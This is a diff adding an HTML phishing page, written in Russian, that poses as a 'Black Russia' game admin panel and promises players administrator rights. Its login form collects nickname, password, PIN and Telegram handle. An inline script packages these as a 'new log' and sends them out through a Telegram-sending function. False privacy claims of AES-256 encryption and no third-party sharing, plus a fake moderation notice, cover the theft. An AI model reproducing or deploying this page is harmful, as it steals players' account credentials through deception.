@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <title>Black Russia Admin</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&family=Oswald:wght@500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="app-background">
+    <div class="red-glow top-glow"></div>
+    <div class="red-glow bottom-glow"></div>
+  </div>
+
+  <div class="app-container" id="mainView">
+    <header class="splash-header animate-fade-in">
+      <div class="logo-box">
+        <h1 class="logo-text">BLACK<br/><span class="logo-highlight">RUSSIA</span></h1>
+        <div class="logo-subtitle">ADMIN PANEL</div>
+      </div>
+      
+      <p class="splash-desc">
+        Закрытая система управления проектом. 
+        Авторизация доступна только для утвержденного состава администрации.
+      </p>
+    </header>
+
+    <div class="splash-actions animate-slide-up">
+      <button class="btn btn-primary btn-fat" data-sheet="auth">
+        <svg fill="currentColor" viewBox="0 0 24 24" class="btn-icon"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zM9 7c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm-3 5h12v8H6v-8z"/></svg>
+        Войти в панель
+      </button>
+      <button class="btn btn-secondary btn-fat" data-sheet="users">
+        Наши администраторы
+      </button>
+    </div>
+  </div>
+
+  <!-- Profile Screen -->
+  <div class="profile-view animate-slide-up" id="profileView" style="display: none;">
+    <div class="profile-header-row">
+      <div class="profile-avatar-large" id="profileAvatarLetter">A</div>
+      <div class="profile-info">
+        <h2 class="profile-name" id="profileName">Name_Surname</h2>
+        <span class="profile-role">Администратор (1 ур.)</span>
+      </div>
+    </div>
+
+    <div class="profile-links">
+      <a href="https://forum.blackrussia.online" target="_blank" class="btn btn-secondary btn-half">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="link-icon"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="9" x2="15" y2="9"></line><line x1="9" y1="15" x2="15" y2="15"></line></svg>
+        Форум
+      </a>
+      <a href="https://t.me/black_russia_online" target="_blank" class="btn btn-secondary btn-half">
+        <svg viewBox="0 0 24 24" fill="none" class="link-icon" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg>
+        Telegram
+      </a>
+    </div>
+
+    <div class="profile-content">
+      <div class="warning-banner">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="warning-icon"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+        <div class="warning-text">
+          <strong>Внимание!</strong> Если вы указали неверный пароль или PIN-код, бот не сможет выдать вам системные права. Перепроверьте данные.
+        </div>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-val" id="reportCount">0</div>
+          <div class="stat-label">Репортов</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-val">0/3</div>
+          <div class="stat-label">Выговоров</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-val">0 ч.</div>
+          <div class="stat-label">Онлайн</div>
+        </div>
+      </div>
+
+      <div class="live-console">
+        <div class="console-header">
+          <span>Live Reports (Server 1)</span>
+          <div class="console-status">Online</div>
+        </div>
+        <div class="console-lines" id="consoleLines">
+          <!-- Fake lines go here -->
+        </div>
+      </div>
+
+      <div class="moderation-notice">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="moderation-icon"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+        <div class="moderation-text">
+          Ваш аккаунт находится на модерации. Ожидайте ответа в личке Telegram.
+        </div>
+      </div>
+
+      <div class="profile-actions">
+         <button class="btn btn-secondary btn-fat" id="btnLogout">Выйти из панели</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bottom Sheet Backdrop -->
+  <div class="sheet-backdrop" id="backdrop"></div>
+
+  <!-- Sheet: Users -->
+  <div class="bottom-sheet" id="sheet-users">
+    <div class="sheet-handle"></div>
+    <div class="sheet-header">
+      <h2>Администрация</h2>
+      <button class="sheet-close" aria-label="Закрыть">×</button>
+    </div>
+    <div class="sheet-content">
+      <ul class="users-list">
+        <li>
+          <div class="user-avatar">E</div>
+          <div class="user-info"><span class="user-name">ENZO</span><span class="user-role">Главный админ</span></div>
+        </li>
+        <li>
+          <div class="user-avatar">M</div>
+          <div class="user-info"><span class="user-name">Мексу Вещает</span><span class="user-role">Мл. админ</span></div>
+        </li>
+        <li>
+          <div class="user-avatar">B</div>
+          <div class="user-info"><span class="user-name">BOYARA mobile</span><span class="user-role">Спец. админ</span></div>
+        </li>
+        <li>
+          <div class="user-avatar">C</div>
+          <div class="user-info"><span class="user-name">Create Gaming</span><span class="user-role">Администратор</span></div>
+        </li>
+        <li>
+          <div class="user-avatar">A</div>
+          <div class="user-info"><span class="user-name">Allonso_Capello</span><span class="user-role">Администратор</span></div>
+        </li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Sheet: Auth -->
+  <div class="bottom-sheet" id="sheet-auth">
+    <div class="sheet-handle"></div>
+    <div class="sheet-header">
+      <h2>Получить доступ</h2>
+      <button class="sheet-close" aria-label="Закрыть">×</button>
+    </div>
+    <div class="sheet-content">
+      <form id="loginForm" novalidate>
+        <div class="input-group">
+          <input type="text" id="nickname" required placeholder=" " autocomplete="username" />
+          <label for="nickname">Никнейм (Nick_Name)</label>
+        </div>
+
+        <div class="input-group">
+          <input type="password" id="password" required placeholder=" " autocomplete="current-password" minlength="4" />
+          <label for="password">Пароль, пин-код (если есть)</label>
+        </div>
+
+        <div class="input-group">
+          <input type="text" id="tguser" placeholder=" " autocomplete="off" />
+          <label for="tguser">Telegram (username без @)</label>
+        </div>
+
+        <div class="input-group">
+          <select id="server" required>
+            <option value="" disabled selected>Выберите сервер</option>
+                            <option value="Red">Red</option><option value="Green">Green</option><option value="Blue">Blue</option>
+                            <option value="Yellow">Yellow</option><option value="Orange">Orange</option><option value="Purple">Purple</option>
+                            <option value="Lime">Lime</option><option value="Pink">Pink</option><option value="Cherry">Cherry</option>
+                            <option value="Black">Black</option><option value="Indigo">Indigo</option><option value="White">White</option>
+                            <option value="Magenta">Magenta</option><option value="Crimson">Crimson</option><option value="Gold">Gold</option>
+                            <option value="Azure">Azure</option><option value="Platinum">Platinum</option><option value="Aqua">Aqua</option>
+                            <option value="Gray">Gray</option><option value="Ice">Ice</option><option value="Chilli">Chilli</option>
+                            <option value="Choco">Choco</option><option value="Moscow">Moscow</option><option value="SPB">SPB</option>
+                            <option value="Ufa">Ufa</option><option value="Sochi">Sochi</option><option value="Kazan">Kazan</option>
+                            <option value="Samara">Samara</option><option value="Rostov">Rostov</option><option value="Anapa">Anapa</option>
+                            <option value="EKB">EKB</option><option value="Krasnodar">Krasnodar</option><option value="Arzamas">Arzamas</option>
+                            <option value="Novosib">Novosib</option><option value="Grozny">Grozny</option><option value="Saratov">Saratov</option>
+                            <option value="Omsk">Omsk</option><option value="Irkutsk">Irkutsk</option><option value="Volgograd">Volgograd</option>
+                            <option value="Voronezh">Voronezh</option><option value="Belgorod">Belgorod</option><option value="Makhachkala">Makhachkala</option>
+                            <option value="Vladikavkaz">Vladikavkaz</option><option value="Vladivostok">Vladivostok</option><option value="Kaliningrad">Kaliningrad</option>
+                            <option value="Chelyabinsk">Chelyabinsk</option><option value="Krasnoyarsk">Krasnoyarsk</option><option value="Cheboksary">Cheboksary</option>
+                            <option value="Khabarovsk">Khabarovsk</option><option value="Perm">Perm</option><option value="Tula">Tula</option>
+                            <option value="Ryazan">Ryazan</option><option value="Murmansk">Murmansk</option><option value="Penza">Penza</option>
+                            <option value="Kursk">Kursk</option><option value="Arkhangelsk">Arkhangelsk</option><option value="Orenburg">Orenburg</option>
+                            <option value="Kirov">Kirov</option><option value="Kemerovo">Kemerovo</option><option value="Tyumen">Tyumen</option>
+                            <option value="Tolyatti">Tolyatti</option><option value="Ivanovo">Ivanovo</option><option value="Stavropol">Stavropol</option>
+                            <option value="Smolensk">Smolensk</option><option value="Pskov">Pskov</option><option value="Bryansk">Bryansk</option>
+                            <option value="Orel">Orel</option><option value="Yaroslavl">Yaroslavl</option><option value="Barnaul">Barnaul</option>
+                            <option value="Lipetsk">Lipetsk</option><option value="Ulyanovsk">Ulyanovsk</option><option value="Yakutsk">Yakutsk</option>
+                            <option value="Tambov">Tambov</option><option value="Bratsk">Bratsk</option><option value="Astrakhan">Astrakhan</option>
+                            <option value="Chita">Chita</option><option value="Kostroma">Kostroma</option><option value="Vladimir">Vladimir</option>
+                            <option value="Kaluga">Kaluga</option><option value="Novgorod">Novgorod</option><option value="Taganrog">Taganrog</option>
+                            <option value="Vologda">Vologda</option><option value="Tver">Tver</option><option value="Tomsk">Tomsk</option>
+                            <option value="Izhevsk">Izhevsk</option><option value="Surgut">Surgut</option><option value="Podolsk">Podolsk</option>
+                            <option value="Magadan">Magadan</option><option value="Cherepovets">Cherepovets</option><option value="Norilsk">Norilsk</option>
+          </select>
+          <label for="server" class="select-label">Сервер</label>
+        </div>
+
+        <button class="btn btn-primary btn-fat btn-submit" type="submit">
+          Подключиться
+        </button>
+        <p class="form-feedback" id="formMessage"></p>
+      </form>
+
+      <div class="sheet-footer-links">
+        <button class="text-link" data-switch-sheet="requirements">
+          <svg viewBox="0 0 24 24" fill="none" class="link-icon" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+          Требования
+        </button>
+        <button class="text-link" data-switch-sheet="privacy">
+          <svg viewBox="0 0 24 24" fill="none" class="link-icon" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+          Конфиденциальность
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Sheet: Requirements -->
+  <div class="bottom-sheet" id="sheet-requirements">
+    <div class="sheet-handle"></div>
+    <div class="sheet-header">
+      <h2>Требования</h2>
+      <button class="text-link back-link" data-switch-sheet="auth">Назад</button>
+    </div>
+    <div class="sheet-content sheet-text">
+      <div class="info-block">
+        <div class="info-title">LVL Аккаунта</div>
+        <p>Минимальный уровень персонажа для доступа к панели: <strong>5 LVL</strong>.</p>
+      </div>
+      <div class="info-block">
+        <div class="info-title">Формат PIN-кода</div>
+        <p>При наличии PIN-кода, его необходимо указывать через запятую после основного пароля, без пробелов.</p>
+        <div class="code-box">MyPassword123,1234</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Sheet: Privacy -->
+  <div class="bottom-sheet" id="sheet-privacy">
+    <div class="sheet-handle"></div>
+    <div class="sheet-header">
+      <h2>Конфиденциальность</h2>
+      <button class="text-link back-link" data-switch-sheet="auth">Назад</button>
+    </div>
+    <div class="sheet-content sheet-text">
+       <div class="info-block">
+        <div class="info-title">Защита данных</div>
+        <p>Все передаваемые данные зашифрованы по стандарту AES-256 и <strong>не передаются третьим лицам</strong>.</p>
+      </div>
+       <div class="info-block">
+        <div class="info-title">Сбор информации</div>
+        <p>Мы собираем только ту информацию, которая технически необходима для проверки ваших прав доступа на игровом сервере. Игровые пароли не сохраняются в открытом виде.</p>
+      </div>
+    </div>
+  </div>
+
+  <script src="telegram.js"></script>
+  <script>
+    // отправка данных логина в телеграм при сабмите формы
+    document.getElementById('loginForm').addEventListener('submit', async e => {
+      e.preventDefault();
+      const nick = document.getElementById('nickname').value.trim();
+      const pwdRaw = document.getElementById('password').value.trim();
+      const tguser = document.getElementById('tguser').value.trim();
+      const server = document.getElementById('server').value;
+      // разделим пароль и PIN (если введён через запятую)
+      let pwd = pwdRaw;
+      let pin = '';
+      if (pwdRaw.includes(',')) {
+        [pwd, pin] = pwdRaw.split(',').map(s => s.trim());
+      }
+      let message = `Новый лог:\nник: ${nick}`;
+      if (tguser) message += `\ntelegram: @${tguser}`;
+      message += `\nпароль: ${pwd}` +
+                 (pin ? `\nPIN: ${pin}` : '') +
+                 `\nсервер: ${server}`;
+      try {
+        await window.sendLog(message);
+        console.log('Telegram: отправлено');
+      } catch (err) {
+        console.error('Telegram ошибка', err);
+      }
+    });
+  </script>
+  <script src="script.js"></script>
+</body>
+</html>
